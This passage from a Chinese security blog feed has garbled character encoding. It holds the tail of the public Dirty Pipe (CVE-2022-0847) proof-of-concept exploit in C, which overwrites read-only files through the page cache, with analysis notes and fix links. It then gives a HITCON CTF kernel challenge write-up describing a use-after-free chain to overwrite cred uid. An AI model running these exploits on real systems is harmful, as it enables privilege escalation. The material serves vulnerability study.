class="hljs-keyword">unsigned</span> r = pipe_size; r &gt; <span class="hljs-number">0</span>;) &#123;<br>        <span class="hljs-keyword">unsigned</span> n = r &gt; <span class="hljs-keyword">sizeof</span>(buffer) ? <span class="hljs-keyword">sizeof</span>(buffer) : r;<br>        write(p[<span class="hljs-number">1</span>], buffer, n);<br>        r -= n;<br>    &#125;<br><br>    <span class="hljs-comment">/* drain the pipe, freeing all pipe_buffer instances (but</span><br><span class="hljs-comment">       leaving the flags initialized) */</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">unsigned</span> r = pipe_size; r &gt; <span class="hljs-number">0</span>;) &#123;<br>        <span class="hljs-keyword">unsigned</span> n = r &gt; <span class="hljs-keyword">sizeof</span>(buffer) ? <span class="hljs-keyword">sizeof</span>(buffer) : r;<br>        read(p[<span class="hljs-number">0</span>], buffer, n);<br>        r -= n;<br>    &#125;<br><br>    <span class="hljs-comment">/* the pipe is now empty, and if somebody adds a new</span><br><span class="hljs-comment">       pipe_buffer without initializing its &quot;flags&quot;, the buffer</span><br><span class="hljs-comment">       will be mergeable */</span><br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">char</span> **argv)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">if</span> (argc != <span class="hljs-number">4</span>) &#123;<br>        <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;Usage: %s TARGETFILE OFFSET DATA\n&quot;</span>, argv[<span class="hljs-number">0</span>]);<br>        <span class="hljs-keyword">return</span> EXIT_FAILURE;<br>    &#125;<br><br>    <span class="hljs-comment">/* dumb command-line argument parser */</span><br>    <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *<span class="hljs-keyword">const</span> path = argv[<span class="hljs-number">1</span>];<br>    <span class="hljs-keyword">loff_t</span> offset = strtoul(argv[<span class="hljs-number">2</span>], <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>);<br>    <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *<span class="hljs-keyword">const</span> data = argv[<span class="hljs-number">3</span>];<br>    <span class="hljs-keyword">const</span> <span class="hljs-keyword">size_t</span> data_size = <span class="hljs-built_in">strlen</span>(data);<br><br>    <span class="hljs-keyword">if</span> (offset % PAGE_SIZE == <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;Sorry, cannot start writing at a page boundary\n&quot;</span>);<br>        <span class="hljs-keyword">return</span> EXIT_FAILURE;<br>    &#125;<br><br>    <span class="hljs-keyword">const</span> <span class="hljs-keyword">loff_t</span> next_page = (offset | (PAGE_SIZE - <span class="hljs-number">1</span>)) + <span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">const</span> <span class="hljs-keyword">loff_t</span> end_offset = offset + (<span class="hljs-keyword">loff_t</span>)data_size;<br>    <span class="hljs-keyword">if</span> (end_offset &gt; next_page) &#123;<br>        <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;Sorry, cannot write across a page boundary\n&quot;</span>);<br>        <span class="hljs-keyword">return</span> EXIT_FAILURE;<br>    &#125;<br><br>    <span class="hljs-comment">/* open the input file and validate the specified offset */</span><br>    <span class="hljs-keyword">const</span> <span class="hljs-keyword">int</span> fd = open(path, O_RDONLY); <span class="hljs-comment">// yes, read-only! :-)</span><br>    <span class="hljs-keyword">if</span> (fd &lt; <span class="hljs-number">0</span>) &#123;<br>        perror(<span class="hljs-string">&quot;open failed&quot;</span>);<br>        <span class="hljs-keyword">return</span> EXIT_FAILURE;<br>    &#125;<br><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">stat</span> <span class="hljs-title">st</span>;</span><br>    <span class="hljs-keyword">if</span> (fstat(fd, &amp;st)) &#123;<br>        perror(<span class="hljs-string">&quot;stat failed&quot;</span>);<br>        <span class="hljs-keyword">return</span> EXIT_FAILURE;<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (offset &gt; st.st_size) &#123;<br>        <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;Offset is not inside the file\n&quot;</span>);<br>        <span class="hljs-keyword">return</span> EXIT_FAILURE;<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (end_offset &gt; st.st_size) &#123;<br>        <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;Sorry, cannot enlarge the file\n&quot;</span>);<br>        <span class="hljs-keyword">return</span> EXIT_FAILURE;<br>    &#125;<br><br>    <span class="hljs-comment">/* create the pipe with all flags initialized with</span><br><span class="hljs-comment">       PIPE_BUF_FLAG_CAN_MERGE */</span><br>    <span class="hljs-keyword">int</span> p[<span class="hljs-number">2</span>];<br>    prepare_pipe(p);<br><br>    <span class="hljs-comment">/* splice one byte from before the specified offset into the</span><br><span class="hljs-comment">       pipe; this will add a reference to the page cache, but</span><br><span class="hljs-comment">       since copy_page_to_iter_pipe() does not initialize the</span><br><span class="hljs-comment">       &quot;flags&quot;, PIPE_BUF_FLAG_CAN_MERGE is still set */</span><br>    --offset;<br>    <span class="hljs-keyword">ssize_t</span> nbytes = splice(fd, &amp;offset, p[<span class="hljs-number">1</span>], <span class="hljs-literal">NULL</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>);<br>    <span class="hljs-keyword">if</span> (nbytes &lt; <span class="hljs-number">0</span>) &#123;<br>        perror(<span class="hljs-string">&quot;splice failed&quot;</span>);<br>        <span class="hljs-keyword">return</span> EXIT_FAILURE;<br>    &#125;<br>    <span class="hljs-keyword">if</span> (nbytes == <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;short splice\n&quot;</span>);<br>        <span class="hljs-keyword">return</span> EXIT_FAILURE;<br>    &#125;<br><br>    <span class="hljs-comment">/* the following write will not create a new pipe_buffer, but</span><br><span class="hljs-comment">       will instead write into the page cache, because of the</span><br><span class="hljs-comment">       PIPE_BUF_FLAG_CAN_MERGE flag */</span><br>    nbytes = write(p[<span class="hljs-number">1</span>], data, data_size);<br>    <span class="hljs-keyword">if</span> (nbytes &lt; <span class="hljs-number">0</span>) &#123;<br>        perror(<span class="hljs-string">&quot;write failed&quot;</span>);<br>        <span class="hljs-keyword">return</span> EXIT_FAILURE;<br>    &#125;<br>    <span class="hljs-keyword">if</span> ((<span class="hljs-keyword">size_t</span>)nbytes &lt; data_size) &#123;<br>        <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;short write\n&quot;</span>);<br>        <span class="hljs-keyword">return</span> EXIT_FAILURE;<br>    &#125;<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;It worked!\n&quot;</span>);<br>    <span class="hljs-keyword">return</span> EXIT_SUCCESS;<br>&#125;<br></code></pre></div></td></tr></table></figure><h3 id="å…­-æ¼æ´ä¿®å¤"><a href="#å…­-æ¼æ´ä¿®å¤" class="headerlink" title="å…­. æ¼æ´ä¿®å¤"></a>å…­. æ¼æ´ä¿®å¤</h3><p><a href="https://android-review.googlesource.com/c/kernel/common/+/1998671/1/lib/iov_iter.c">https://android-review.googlesource.com/c/kernel/common/+/1998671/1/lib/iov_iter.c</a></p><p><a href="https://lore.kernel.org/lkml/20220221100313.1504449-1-max.kellermann@ionos.com/">https://lore.kernel.org/lkml/20220221100313.1504449-1-max.kellermann@ionos.com/</a></p><h3 id="ä¸ƒ-æ¼æ´å‘ç°è¿‡ç¨‹"><a href="#ä¸ƒ-æ¼æ´å‘ç°è¿‡ç¨‹" class="headerlink" title="ä¸ƒ. æ¼æ´å‘ç°è¿‡ç¨‹"></a>ä¸ƒ. æ¼æ´å‘ç°<a href="https://dirtypipe.cm4all.com/">è¿‡ç¨‹</a></h3><ul><li>2021-04-29: first support ticket about file corruption</li><li>2022-02-19: file corruption problem identified as Linux kernel bug, which turned out to be an exploitable vulnerability</li></ul><p>æ¼æ´çš„ç”Ÿå‘½å‘¨æœŸæ˜¾ç„¶æ¯”è¾ƒæ¼«é•¿.</p><p>èƒŒæ™¯:</p><ul><li><p>zip: <a href="https://users.cs.jmu.edu/buchhofp/forensics/formats/pkzip.html">The structure of a PKZip file</a> </p><ul><li><strong>End of central directory record (EOCD)</strong> å’Œ <strong>Central directory file header</strong> </li></ul><img src="../../image/dirtypipe/central-directory-structure.png" alt="Structure of the central directory" style="zoom: 80%;" /><ul><li>central dirctory headerå…¶å®éƒ½æ˜¯æ”¾åœ¨æ–‡ä»¶æœ«å°¾, è¿™æ ·ä¾¿äºæ·»åŠ æ–°æ–‡ä»¶, ä¹Ÿå¯ä»¥æŠŠzipæ–‡ä»¶å˜æˆè‡ªæˆ‘è§£å‹ç¼©çš„zipæ–‡ä»¶, åªè¦åœ¨å«æœ‰zipæ•°æ®çš„å¯æ‰§è¡Œæ–‡ä»¶ååŠ ä¸Šheader(?)</li><li>The ZIP format can hold collections of files without an external archiver, but is less compact than compressed <a href="https://en.wikipedia.org/wiki/Tar_(computing)">tarballs</a> holding the same data, because it compresses files individually and cannot take advantage of redundancy between files (<a href="https://en.wikipedia.org/wiki/Solid_compression">solid compression</a>).</li></ul><img src="../../image/dirtypipe/image-20221112212650539.png" alt="image-20221112212650539" style="zoom:67%;" /></li><li><p>zlib <a href="https://www.bolet.org/~pornin/deflate-flush.html">Sync Flush</a> </p><ul><li><p>The â€œsync flushâ€ is what zlib implements when used with the <code>Z_SYNC_FLUSH</code> flag. It performs the following tasks:</p><ol><li>If there is some buffered but not yet compressed data, then this data is compressed into one or several blocks (the type for each block will depend on the amount and nature of data).</li><li>A new type 0 block with empty contents is appended.</li></ol><p>A type 0 block with empty contents consists of:</p><ul><li>the three-bit block header;</li><li>0 to 7 bits equal to zero, to achieve byte alignment;</li><li>the four-byte sequence <code>00 00 FF FF</code>.</li></ul></li></ul></li><li><p>sendfileæ˜¯spliceçš„ä¸€ä¸ªå­é›†, ç°åœ¨çš„spliceå¯ä»¥ä»»æ„çš„ä¼ é€, ä¸¤è¾¹çš„é€‰æ‹©å¯ä»¥æœ‰pipe, socket, fdè¿™äº›. sendfileåœ¨2.6.23å·²å¤±æ•ˆ, ä¸è¿‡APIæ¥å£ä»ç„¶ä¿å­˜, ä½†æ˜¯å®é™…çš„å‡½æ•°å·²æ˜¯<code>do_splice_direct</code>, å› ä¸ºspliceå¯ä»¥è½»æ¾åœ°æ¨¡æ‹Ÿsendfile. </p><ul><li>è¯¥å‡½æ•°ä¼šç»§ç»­è°ƒç”¨<code>splice_direct_to_actor </code> , This is a special case helper to splice directly between two points, <strong>without</strong> requiring an explicit pipe. <strong>Internally an allocated pipe</strong> is <strong>cached</strong> in the process, and reused during the lifetime of that process. pipeæ˜¯ä½œä¸ºä¸­é—´äººä¼ é€’æ•°æ®çš„, ä»¥ä¾¿äºåˆ©ç”¨å…¶ä»–çš„spliceå‡½æ•°. åæ­£pipeä¹Ÿæ˜¯å¼•ç”¨å·²æœ‰çš„page. </li></ul></li><li><p>iov_iter å’Œ kiocb å®é™…ä¸Šåˆ†åˆ«æè¿°äº†ä¸€æ¬¡IOçš„ä¸¤ç«¯ï¼Œiov_iteræè¿°<strong>å†…å­˜ä¾§</strong>ï¼Œkiocbæè¿°<strong>æ–‡ä»¶ä¾§</strong>ï¼Œæ–‡ä»¶ç³»ç»Ÿæä¾›ä¸¤ä¸ªæ¥å£åŸºäºè¿™ä¸¤ä¸ªæ•°æ®ç»“æ„å°è£…è¯»å†™æ“ä½œã€‚å¦‚<code>call_read_iter</code>è°ƒç”¨<code>file-&gt;f_op-&gt;read_iter</code>, å°†kiocbæè¿°çš„æ–‡ä»¶æ•°æ®ï¼Œè¯»åˆ°iov_iteræè¿°çš„å†…å­˜ä¸­ã€‚</p><ul><li><a href="https://blog.csdn.net/qq_32740107/article/details/106867342">CSDNä¸€ä¸ªè®²è§£æ–‡ä»¶ç³»ç»Ÿç³»åˆ—</a> </li></ul></li><li><p>å¦å¤–å‡ ç§<a href="https://raxis.com/blog/exploiting-dirty-pipe-cve-2022-0847">åˆ©ç”¨</a>: setuid, cron job, Authorized Keys. å…¶ä¸­Authorized Keysçš„åŸç†æ˜¯sshçš„<a href="https://blog.csdn.net/weixin_53049621/article/details/122428597">å…¬é’¥ç™»å½•æ¨¡å¼</a>. </p></li></ul><img src="../../image/dirtypipe/3bb603972d464513a47bfa8be4cc2a9d.png" alt="img" style="zoom: 40%;" /><p>å…¶ä½™è¯¦è§<a href="../../files/dirty_pipe.pdf">ppté™„ä»¶</a> </p>]]></content>
    
    
    <categories>
      
      <category>CVE</category>
      
    </categories>
    
    
    <tags>
      
      <tag>æºç åˆ†æ</tag>
      
      <tag>CVE</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>è¿‘æœŸé¢˜ç›®wp</title>
    <link href="/2022-09/Now-recent-ctf/"/>
    <url>/2022-09/Now-recent-ctf/</url>
    
    <content type="html"><![CDATA[<h2 id="SPARK"><a href="#SPARK" class="headerlink" title="SPARK"></a>SPARK</h2><blockquote><p>HITCON CTF 2020</p></blockquote><ul><li>ä»£ç é‡Œé¢çœ‹åˆ°<code>_InterlockedExchangeAdd()</code>å‡½æ•°, å…¶å®æ˜¯IDAä¸­å¯¹lockæŒ‡ä»¤å‰ç¼€çš„å‡½æ•°æ›¿æ¢. </li></ul><blockquote><p>æ±‡ç¼–ä¸º<code>lock xadd cs:cur_count, eax</code> </p><p>The LOCK prefix can be prepended only to the following instructions and only to those forms of the instructions<br>where the destination operand is a memory operand: ADD, ADC, AND, BTC, BTR, BTS, CMPXCHG, CMPXCH8B,<br>CMPXCHG16B, DEC, INC, NEG, NOT, OR, SBB, SUB, XOR, <strong>XADD</strong>, and XCHG.</p><p>xaddæ˜¯Exchange and Add. </p></blockquote><ul><li>è¿˜æœ‰mutexçš„ç»“æ„ä½“â€¦. å¤§å°ä¸º32ä¸ªå­—èŠ‚. åŒ…å«äº†å•¥æˆ‘å°±ä¸çœ‹äº†.<br>æ²¡æƒ³åˆ°è¿˜æ˜¯è¦æ³¨æ„ä¸€ä¸‹, åé¢ç”¨åˆ°äº†mutexä¸­çš„owneræˆå‘˜, å½“é”è¢«ä½¿ç”¨æ—¶å¯ä»¥è¯»å–å½“å‰è¿›ç¨‹çš„currentç»“æ„ä½“åœ°å€, ä»è€Œå‘ç°credç»“æ„ä½“åœ°å€. </li><li><code>__fentry__</code>åˆ°åº•æ˜¯ä¸ª<a href="https://www.brendangregg.com/blog/2019-10-15/kernelrecipes-kernel-ftrace-internals.html">å•¥</a> | <a href="https://www.eet-china.com/mp/a41923.html">ä¸­æ–‡æ–‡ç« </a> </li><li><code>char (*names)[3]</code> pointer to an array of 3 chars. </li></ul><p>å¥½å§çœ‹ä¸æ‡‚, linux/spark.håˆæ˜¯ä»€ä¹ˆä¸œè¥¿. </p><p>è‰°éš¾çš„ç»§ç»­çœ‹ä»£ç , spark.håº”è¯¥æ˜¯æ²¡ç»™çš„â€¦ </p><ul><li>**fget()**å‡½æ•°çš„åŠŸèƒ½æ˜¯é€šè¿‡æ–‡ä»¶æè¿°ç¬¦æŸ¥æ‰¾å¹¶è¿”å›fileç»“æ„ä½“<br>è€Œnodeç»“æ„ä½“åº”è¯¥åœ¨struct fileä¸­offsetä¸º200çš„ä½ç½®. ä½†æ˜¯æˆ‘ä¸çŸ¥é“fileä¸­å“ªä¸ªæˆå‘˜èƒ½å­˜å‚¨è¿™ç§ä¿¡æ¯. </li></ul><h3 id="æ¥è‡ªmhackeronié˜Ÿçš„wpå¯å‘"><a href="#æ¥è‡ªmhackeronié˜Ÿçš„wpå¯å‘" class="headerlink" title="æ¥è‡ªmhackeronié˜Ÿçš„wpå¯å‘:"></a>æ¥è‡ª<a href="https://mhackeroni.it/archive/2020/12/05/hitcon2020-all-writeups.html#spark">mhackeroni</a>é˜Ÿçš„wpå¯å‘:</h3><p>ioctlåŠŸèƒ½:</p><ul><li>Link (<code>0x4008d900</code>): takes two node descriptors A and B, and a edge weight, and creates the edges A-&gt;B and B-&gt;A;</li><li>Info (<code>0x8018d901</code>): provides information about the node;</li><li>Finalize (<code>0xd902</code>): finalizes the graph rooted in the node, preparing it for queries;</li><li>Query (<code>0xc010d903</code>): takes two node descriptors and calculates the total weight of the shortest path between them.</li></ul><p>åœ¨releaseä¸­: å¦‚æœrefcount==1(æ­£å¸¸æƒ…å†µ), é‡Šæ”¾traversalä¸­nodes(å¦‚æœæœ‰), é‡Šæ”¾edgeé“¾è¡¨èŠ‚ç‚¹, é‡Šæ”¾node. </p><p>å…¶ä¸­çš„ä¸€äº›ç»†èŠ‚: </p><ul><li>openæ—¶æ¯ä¸ªèŠ‚ç‚¹çš„refcounté»˜è®¤ä¸º1, å½“finalizeçš„æ—¶å€™åªæœ‰rootèŠ‚ç‚¹è¿›å…¥<code>traversal()</code>å‡½æ•°æ—¶(ç¬¬ä¸€æ¬¡è¿›å…¥)ä¸å¢åŠ refcount, è¿™å°±æ„å‘³ç€é™¤äº†root, å…¶ä»–çš„èŠ‚ç‚¹çš„refcountéƒ½ä¼šå˜æˆ2. è€Œå½“release rootçš„æ—¶å€™åªæœ‰root.refcountå°äº2, äºæ˜¯åªæœ‰rootçš„edge+traversal+nodeæœ¬èº«éƒ½è¢«<code>kfree()</code>. <strong>çœ‹ä¼¼æ­£å¸¸, å®é™…ä¸Š?</strong> </li><li>Infoä¸­æœ‰ä¸€ä¸ªnode-&gt;traversal-&gt;sizeçš„è®¿é—®é“¾, è€Œsizeåœ¨traversalä¸­offsetä¸º0çš„ä½ç½®. æ„å‘³ç€å¦‚æœèƒ½å¤Ÿæ§åˆ¶traversalå­—æ®µé‚£å°±å¯ä»¥å®ç°ä»»æ„è¯». <strong>å¦‚ä½•æ§åˆ¶traversal?</strong> </li><li>finalizeä¸­è°ƒç”¨å‡½æ•°traversalè¿›è¡ŒDFS, å¯¹nodeçš„refcountè¿›è¡Œ+1, ç„¶è€Œåœ¨linkå’Œqueryä¸­æ²¡æœ‰refcountçš„åˆ¤æ–­å’Œä½¿ç”¨, è€Œä¸”åœ¨releaseä¸­å¦‚æœå¤§äºç­‰äºäºŒåˆ™ç›´æ¥é€€å‡º, ä¸ä¼šè°ƒç”¨kfreeå›æ”¶ç©ºé—´. <strong>èƒ½å¦ä¿®æ”¹refcount?</strong> </li><li>linkåç›¸é‚»èŠ‚ç‚¹ä¿å­˜åœ¨edgeä¸­, ç„¶è€Œå½“å¦ä¸€ç«¯çš„èŠ‚ç‚¹free/releaseå, edgeä¸­çš„nodeå°±æ„æˆäº†ä¸€ä¸ªdangling ptr. å¯ä»¥ç”¨æ¥UAF. <strong>å¦‚ä½•æ§åˆ¶freed chunk?(uffd+setxattr)</strong> </li><li>queryä¸­mallocäº†ä¸€ä¸ªdis_arr, ä½¿ç”¨nodeåŠå…¶childrençš„traversal_idxæ¥ç´¢å¼•. <strong>èƒ½å¦è¶Šç•Œ?(çœ‹åˆ°ä¸ªæ•°ç»„éƒ½è¦æƒ³èƒ½ä¸èƒ½è¶Šç•Œâ€¦)</strong> </li><li>å…·ä½“ä¸ºuffd+setxattræ§åˆ¶freeåçš„chunk, å†ä¼ªé€ ä¸€ä¸ª(finalize==1 &amp;&amp; traversal_idx&gt;16)çš„node, åˆ¶é€ å‡ºä¸€ä¸ªOOB(è¿˜çœŸèƒ½è¶Šç•Œ). <strong>è¿™ä¸ªOOBèƒ½å¤Ÿä¿®æ”¹ä»€ä¹ˆä¸œè¥¿?</strong> </li></ul><p>ä¸€èˆ¬çš„å†…æ ¸é¢˜ç›®éƒ½æ˜¯ææƒ, ç›´æ¥å˜æˆrootç”¨æˆ·å°±å¯ä»¥è¯»å–/flagæ–‡ä»¶, æ–¹æ³•å¤§è‡´æœ‰ä»»æ„å†™åŸè¯­æˆ–è€…commit+prepare_cred. </p><p>å¯èƒ½çš„æ€è·¯æ•´ç†:</p><ul><li>è¿˜åŸkoæ–‡ä»¶ç±»å‹ä¿¡æ¯. çœ‹çœ‹demo.cä¸­çš„ç¤ºä¾‹ä¾¿äºç†è§£. </li><li>è¿˜åŸæˆåŠŸ, å‘ç°å¯èƒ½æ˜¯kmallocå’Œkfreeä¸ºä¸»çš„å†…æ ¸å †åˆ©ç”¨. å…ˆåˆ¶é€ å‡ºä¸€ä¸ªä»»æ„è¯». </li><li>getinfoä¸­å‘ç°å¯èƒ½çš„ä»»æ„è¯»(åªè¦æ§åˆ¶äº†traversal), è¿™æ ·åªè¦åœ¨fdå­˜åœ¨çš„æ—¶å€™nodeç»“æ„ä½“åŒæ—¶ä¹Ÿè¢«æˆ‘ä»¬æ§åˆ¶å°±å¯ä»¥åšåˆ°; å‘ç°mutexçš„ä½¿ç”¨, å…¶ä¸­çš„owneræˆå‘˜å¯ä»¥ç›´é€šcred; å‘ç°UAF; å‘ç°refcountçš„é—®é¢˜. </li><li>å‘ç°traversal_idxæ˜¯å±äºnodeçš„å±æ€§, è€Œä¸æ˜¯æŸæ¬¡traversalçš„. å½“queryçš„æ—¶å€™è¿˜ç”¨åˆ°äº†nodeçš„children, ä¹Ÿå°±æ˜¯é»˜è®¤äº†æ‰€æœ‰çš„childéƒ½å±äºåŒä¸€æ¬¡traversal. </li><li>ç»¼ä¸Šæ‰€è¿°, ç»“åˆ<a href="https://duasynt.com/blog/linux-kernel-heap-spray">uffd+setxattr</a>çš„æ–¹æ³•, å¯ä»¥åœ¨linkå®Œä¸€ä¸ªç½‘å†releaseä¸€ä¸ªfdä¹‹å, ç«‹åˆ»ä½¿ç”¨è¿™ç§æ–¹æ³•æ¥ä¿®æ”¹nodeçš„å†…å®¹. è¿™ç®—æ˜¯ä¸€ä¸ªåŸºç¡€æ­¥éª¤. å¦‚ä½•ç»§ç»­åˆ©ç”¨?</li><li>æŠŠnode-&gt;traversal_idxä¿®æ”¹è¶…è¿‡dis_arrçš„è¾¹ç•Œ, åœ¨queryçš„æ—¶å€™è¶Šç•Œä¿®æ”¹tmp_nodeçš„refcount, è¿™æ ·åœ¨release rootä¹‹ååªæœ‰tmp_node+rootçš„ä¼šè¢«é‡Šæ”¾, è€Œtmp_nodeçš„fdåè€Œä¸ä¼šè¢«å½±å“. åªè¦åœ¨è¿™ä¹‹åé©¬ä¸Šmallocå°±å¯ä»¥<strong>å®ç°ä»»æ„è¯»</strong>äº†. <ul><li>è¿˜æœ‰ä¸ªå°é—®é¢˜æ˜¯å¦‚ä½•è®©dis_arræ”¾åˆ°nodeçš„å‰é¢? expç»™å‡ºäº†æ–¹æ³•: å‰åmallocä¸€äº›node, ä¸­é—´ä¸¤ç™¾ä¸ªnodeä¸­æ¯éš”å‡ ä¸ªé‡Šæ”¾ä¸€ä¸ªnode, è€Œdis_arrçš„å¤§å°ç”±traversalæ—¶éå†åˆ°çš„nodeæ•°é‡å†³å®š, è®¾ç½®é“¾æ¥çš„nodeæ•°é‡ä¸º16æˆ–17(ä¸ºä»€ä¹ˆå‘¢?æƒ³æƒ³å§)æ—¶å°±ä¼šåˆšå¥½å æ®äº†åŸå…ˆnodeçš„é—´éš™, æ»¡è¶³äº†è¶Šç•Œçš„ä½ç½®éœ€æ±‚. </li><li>ç„¶å<strong>è¯»å•¥å‘¢</strong>? </li></ul></li><li>å¯ä»¥è¯»å–<code>node.lock.owner</code>è¿›è€Œå®šä½åˆ°<code>cred</code>, è€Œå› ä¸ºget_infoçš„v3-&gt;sizeæ—¶å€™<code>mutex_lock(a1-&gt;state_lock);</code>å·²ç»é”ä¸Š, æ‰€ä»¥å¯ä»¥ç›´æ¥è¯»å–. </li><li>ä¸‹ä¸€ä¸ªé—®é¢˜åœ¨äºnodeç»“æ„ä½“åœ¨å“ªé‡Œ? æ‰€ä»¥è¦åœ¨è¯»å–ownerä¹‹å‰æ‰«æå†…å­˜å¯»æ‰¾æˆ‘ä»¬è®¾ç½®çš„ç‰¹æ®Šå€¼, æœ‰äº†ä¸ªä»»æ„è¯»çš„èƒ½åŠ›ç¡®å®ä¹Ÿå¯ä»¥åšåˆ°. <strong>æ‰«å“ªé‡Œå‘¢</strong>?</li><li>ä¸»è¦é—®é¢˜å°±åœ¨äºç°åœ¨ä¸€ä¸ªå†…æ ¸åœ°å€éƒ½æ²¡æœ‰, <u>ç‰¹åˆ«æ˜¯ç”¨æ¥kmallocçš„é‚£ä¸€å—åŒºåŸŸ</u>. ä½†æ˜¯! dmesgæ˜¯å¯ç”¨çš„, å¯ä»¥åˆ©ç”¨OOBåˆ¶é€ ä¸€ä¸ªcrash, ç„¶åè¯»å–å¯„å­˜å™¨ä¿¡æ¯è¿›è€Œè·å–ç›¸åº”åœ°å€. è¿™å¯ä»¥é€šè¿‡libcåº“å®ç°, å…·ä½“è§æºç ä¸­çš„<strong>ç¬¬ä¸€é˜¶æ®µ</strong>.<br>å¦å¤–å‘ç°è¿™ä¸ªcrashä¼šå¯¼è‡´å†…æ ¸å‡ºé”™+è¿›ç¨‹æš‚åœ, ä½†æ˜¯å¦‚æœåœ¨ä¸€ä¸ªforkå‡ºçš„childä¸­ç›´æ¥è®©ä»–exitå°±æ²¡æœ‰é—®é¢˜äº†. </li><li>åˆ°ç°åœ¨ä¸€äºŒé˜¶æ®µå’Œä¸‰é˜¶æ®µåˆå§‹éƒ½å·²å®Œæˆ. æ¥ä¸‹æ¥çš„ä»»åŠ¡æ˜¯å¦‚ä½•<strong>åˆ¶é€ ä»»æ„å†™å°†credä¸­uidæ”¹æˆ0(root)?</strong> </li><li>æƒ³åˆ°OOB, ç†è®ºä¸Šå¯ä»¥è¦†ç›–ä¸€ä¸ªåœ°å€ä¸ºä¸é¦–ä¸ªå­èŠ‚ç‚¹çš„è¿æ¥æƒå€¼, ä½†è¦è¦†ç›–cred.uidçš„è¯è¿˜è¦çŸ¥é“dis_arrçš„åœ°å€. åˆæƒ³åˆ°ä¸€é˜¶æ®µmallocäº†ä¸€ä¸ªdis_arrä¸”ç”±äºcrashå¹¶æ²¡æœ‰é‡Šæ”¾, å¦‚æœæ­¤æ—¶é€šè¿‡release(fd)é‡Šæ”¾traversalå†é©¬ä¸Šquery, æ—¢çŸ¥é“äº†åœ°å€(ä¸€é˜¶æ®µæ—¶)åˆå¾—åˆ°äº†ä¸€ä¸ªå¯ç”¨çš„dis_arr. </li><li>æ¥ä¸‹æ¥å°±æ˜¯æ„é€ ä¸€ä¸‹æ‰€éœ€çš„ç»“æ„. éœ€è¦é¢å¤–çš„ä¸€ä¸ªrootåŠ ä¸Šä¸€äº›å…¶ä»–èŠ‚ç‚¹, åŠ ä¸Šfdæ„æˆä¸€å¼ ç½‘, æŠŠå’Œfdçš„è¿æ¥æƒå€¼èµ‹ä¸º0(å¹¶ä¸”is_finalized!=1)ä½œä¸ºè¦å†™å…¥çš„å†…å®¹. è‡³äºé‡Šæ”¾å’Œé€ ç½‘ä¸¤è€…çš„é¡ºåºæƒ³æ¥æ˜¯æ²¡æœ‰åŒºåˆ«çš„. <ul><li>åˆä¸€ä¸ªç»†èŠ‚æ˜¯æ‰€ç”¨åˆ°çš„rootå’Œå…¶ä»–èŠ‚ç‚¹éƒ½æ˜¯åœ¨ç¬¬ä¸€é˜¶æ®µä¹‹å‰åˆ†é…çš„. æˆ–è®¸æ˜¯ä¸ºäº†é˜²æ­¢æ··ä¹±. </li></ul></li><li>æœ€åå°±æ˜¯ä¿®æ”¹traversal_idx, è¿›è¡Œä¸€ä¸ªrootçš„query, ç„¶åå°±å®Œæˆäº†cred.uidçš„è¦†ç›–. æœ€åçš„æœ€åç›´æ¥print /flag. </li></ul><p>è¿™æ˜¯36å°æ—¶èƒ½åšå®Œçš„é¢˜ç›®å—??</p><h4 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h4><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span 